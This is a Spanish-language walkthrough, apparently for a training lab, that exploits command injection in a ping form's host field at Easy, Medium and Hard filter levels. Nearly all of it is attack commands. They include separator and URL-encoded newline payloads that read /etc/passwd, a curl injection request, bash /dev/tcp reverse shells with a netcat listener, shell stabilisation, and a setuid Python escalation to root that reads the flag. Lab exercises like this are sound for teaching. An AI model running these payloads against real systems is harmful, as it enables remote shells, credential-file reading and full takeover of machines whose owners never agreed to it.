Pasos de explotación

  1. El campo host termina dentro de un comando de shell sin sanitización. En Linux, el backend lo ejecuta como alice, así que una reverse shell caerá directamente en /home/alice.
  2. Easy: Usa cualquier separador de comandos: 
    127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | cat /etc/passwd
127.0.0.1; ls -la /
  3. Medium: Filtra ; y | pero permite && y newlines: 
    # && sigue funcionando
127.0.0.1 && whoami
127.0.0.1 && cat /etc/passwd

# Newline via Burp Suite (URL-encode: %0a)
# En Burp Repeater, modifica el body POST:
host=127.0.0.1%0awhoami
  4. Hard: Filtra ; | & ` $ ( ) { } < > — solo el newline (%0a) funciona: 
    # Intercepta con Burp Suite y modifica el body:
host=127.0.0.1%0awhoami
host=127.0.0.1%0acat%20/etc/passwd
host=127.0.0.1%0aid
  5. Con curl (el %0a se interpreta como newline en el body): 
    curl -X POST http://TARGET_IP/cmdi/ping \
  -d "host=127.0.0.1%0awhoami"
  6. Reverse shell para obtener la flag del lab (Easy/Medium): 
    # En Kali, abre un listener:
rlwrap nc -lvnp 4444

# Easy
127.0.0.1; bash -c 'bash -i >& /dev/tcp/{{ target_ip }}/4444 0>&1'

# Medium
127.0.0.1 && bash -c 'bash -i >& /dev/tcp/{{ target_ip }}/4444 0>&1'
  7. Cuando entre la shell, valida el contexto inicial. Debes aterrizar como alice en su home: 
    whoami
pwd
ls -la
cat note.txt
  8. La shell inicial es una dumb shell. Estabilízala antes de la escalada: 
    python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm
stty rows 40 cols 120
  9. Enumera el vector local de privilegios y eleva a root: 
    find / -perm -4000 -type f 2>/dev/null
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  10. Ya como root, lee la flag objetivo del lab: 
    cat /root/root.txt

Herramientas

Burp Suite curl netcat
